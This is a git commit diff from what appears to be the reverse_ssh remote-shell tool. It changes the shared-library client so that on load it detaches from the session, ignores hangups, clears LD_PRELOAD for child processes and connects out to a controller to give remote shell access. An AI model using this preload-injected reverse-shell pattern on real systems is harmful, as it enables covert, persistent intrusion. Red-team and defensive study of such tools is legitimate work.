e16fa74292b957b50061509e5f4ac2f59c9b6cca
NHAS <jordanatararimu@gmail.com>
2022-04-19 20:43:32 +1200

    Clear preload variable for children

--- cmd/client/sharedobj_linux.go
+++ cmd/client/sharedobj_linux.go
@@ -2,8 +2,19 @@
 
 package main
 
-import "github.com/NHAS/reverse_ssh/internal/client"
+import (
+	"os"
+	"os/signal"
+	"syscall"
+
+	"github.com/NHAS/reverse_ssh/internal/client"
+)
 
 func init() {
+	syscall.Setsid()
+	signal.Ignore(syscall.SIGHUP)
+	//If we're loading as a shared lib, stop our children from being polluted
+	os.Setenv("LD_PRELOAD", "")
+
 	client.Run(destination, fingerprint, "")
 }
